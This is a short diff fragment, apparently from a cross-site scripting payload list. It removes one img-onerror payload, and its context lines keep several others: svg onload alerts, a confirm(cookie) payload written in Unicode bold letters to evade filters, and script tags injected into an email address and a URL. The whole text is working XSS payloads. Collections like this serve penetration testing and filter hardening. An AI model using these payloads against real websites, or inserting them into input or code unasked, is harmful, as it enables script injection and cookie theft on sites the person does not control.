@@ -22,7 +22,6 @@ lert&#x000000028;origin&#x000029;>
 /(A(%22onerror='alert%60123%60'test))/
 <Svg On Only=1 Onload=alert(1337)>
 "><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)>
-<Img Src=OnXSS OnError=confirm("Hacked_by_mijan")>
 ab@gmail.com'\"><svg/onload=alert(/xss/)>
 http://example.com/services"><script>alert(1)</script>/services/
 KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui
